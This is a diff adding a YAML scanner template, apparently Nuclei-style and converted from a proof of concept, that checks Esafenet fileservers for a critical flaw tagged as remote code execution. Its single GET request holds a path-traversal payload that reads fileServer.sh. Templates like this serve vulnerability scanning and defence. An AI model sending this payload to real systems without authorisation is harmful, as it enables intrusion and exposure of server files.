@@ -1,0 +1,12 @@
+id: yaml-poc-esafenet-esafenet_fileserver-rce-CT-1002008
+info:
+  name: Yaml Poc Esafenet Esafenet_Fileserver Rce Ct 1002008
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-esafenet-esafenet_fileserver-rce-CT-1002008'
+  tags: rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1
